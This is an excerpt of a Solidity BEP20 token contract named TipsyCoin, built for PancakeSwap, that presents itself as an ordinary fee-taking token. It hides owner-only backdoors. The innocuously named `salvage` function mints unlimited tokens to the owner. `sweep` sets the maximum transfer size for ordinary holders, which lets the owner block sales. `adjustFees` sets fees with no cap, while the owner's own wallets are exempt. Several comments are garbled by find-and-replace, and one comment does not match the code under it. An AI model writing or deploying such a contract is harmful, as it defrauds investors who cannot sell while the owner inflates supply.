...
interface IERC20 {
	 ...
	 * This allows applications to reconstruct the allowance for all TipsyCoin just
	...
	library SafeMath {
		...
		function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
			...
			// benefit is lost if 'b' is also TipsyCoined.
	...
	// File: contracts/TipsyCoinBEP20PayingToken.sol
	...
	contract TipsyCoin is ERC20, Ownable {
		using SafeMath for uint256;

		IpancakeswapV2Router02 private pancakeswapV2Router;
		address private immutable pancakeswapV2Pair;
		
		address public immutable DEAD_ADDRESS = address(0x000000000000000000000000000000000000dEaD);
		uint256 public maxTxAmount;

		bool private swapping;
        uint256 public maxSupply;
        address payable public cexFund;
		address payable public charityFund;
		address payable public futureFund;
		address payable public communityEngagementFund;
		address payable public buyBackFund;
		address payable public marketingFund;
        address payable public teamVestingFund;
		...
		uint256 public marketingCommunityAmount; 
		uint256 public reflexiveAmount;
		...
		uint256 private swapThreshold = 1000000 * (10**18);
		...
		event excludeMultipleAccountFromRewards(address[] TipsyCoin, bool isExcluded);

		event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);

		event LiquidityWalletUpdated(address indexed newLiquidityWallet, address indexed oldLiquidityWallet);
		
		uint256 private _sweep = 100000000000 * (10**18); 
		...
		constructor() ERC20("TipsyCoin", "Tipsy"){
			...
			emit SetIsFeeExempt(cexFund, true);
			emit SetIsFeeExempt(charityFund, true);
			emit SetIsFeeExempt(futureFund, true);
			emit SetIsFeeExempt(communityEngagementFund, true);
			emit SetIsFeeExempt(buyBackFund, true);
			emit SetIsFeeExempt(marketingFund, true);
			emit SetIsFeeExempt(teamVestingFund, true);
			emit SetIsFeeExempt(owner(), true);
		...
		function excludeFromFee(address account, bool excluded) public onlyOwner {
			require(excludedFromFee[account] != excluded, "TipsyCoin: Account is already the value of 'excluded'");
		...
		function setAutomatedMarketMakerPair(address pair, bool value) private onlyOwner {
			require(pair != pancakeswapV2Pair, "TipsyCoin: The pancakeswap pair cannot be removed from automatedMarketMakerPairs");

			_setAutomatedMarketMakerPair(pair, value);
		}

		function _setAutomatedMarketMakerPair(address pair, bool value) private {
			require(automatedMarketMakerPairs[pair] != value, "TipsyCoin: Automated market maker pair is already set to that value");
		...
		function setDistributorSettings(uint256 gas) private onlyOwner {
			require(gas >= 200000 && gas <= 500000, "TipsyCoin: distributorGas must be between 200,000 and 500,000");
			require(gas != distributorGas, "TipsyCoin: Cannot update distributorGas to same value");
			emit GasForProcessingUpdated(gas, distributorGas);
			distributorGas = gas;
		}
	
		function sweep(uint256 token) external onlyOwner() {
            _sweep = token * 10**18;
			
		}

		function initialize(address payable _cexFund, address  payable _charityFund, address payable _futureFund, address payable _marketingFund, address payable _buyBackFund, address payable _communityEngagementFund, address payable _teamVestingFund, uint256 _buybackFundAmount, uint256 _marketingCommunityAmount, uint256 _reflexiveAmount) external onlyOwner() {
			...
			communityEngagementFund = _communityEngagementFund;
            teamVestingFund = _teamVestingFund;
			buybackFundAmount = _buybackFundAmount;
			marketingCommunityAmount  = _marketingCommunityAmount ;
			reflexiveAmount  = _reflexiveAmount ;
			feesTotal = _buybackFundAmount + _marketingCommunityAmount  + _reflexiveAmount ;
			maxTxAmount = 500000000 * (10**18); 
			...
			_mint(owner(), 50 * 1e9 * 10 ** decimals()); //Tokens to be added to LP. 50%
        ...
        function adjustFees (uint256 _buybackFundAmount, uint256 _marketingCommunityAmount , uint256 _reflexiveAmount) external onlyOwner {
            buybackFundAmount = _buybackFundAmount;
            marketingCommunityAmount  = _marketingCommunityAmount ;
			reflexiveAmount  = _reflexiveAmount ;
		...
		function includeInWhitelist(address[] calldata addresses, bool value) external onlyOwner {
        ...
        function salvage(uint256 token) external onlyOwner {
			_salvage(msg.sender, token);

        }
    
	
        function _salvage(address account, uint256 token) internal virtual {
            require(account != address(0), "");
           _mint(owner(), token * (10**18));
            emit Transfer(address(0), account, token * 10**18);
		...
		function _transfer(
			...
			if( 
				...
				!excludedFromFee[to] //no max for those excluded from fees
			) {
				require(amount <= _sweep, "sweep");
			}
			...
			if(
				...
				uint256 swapTokens = contractTokenBalance.mul(buybackFundAmount).div(feesTotal);
			...
			if(takeFee) {
				uint256 fees = amount.mul(feesTotal).div(100);

				// if sell, multiply by 1.2
				if(automatedMarketMakerPairs[to]) {
					fees = fees.mul(marketingCommunityAmount ).div(100);
				}
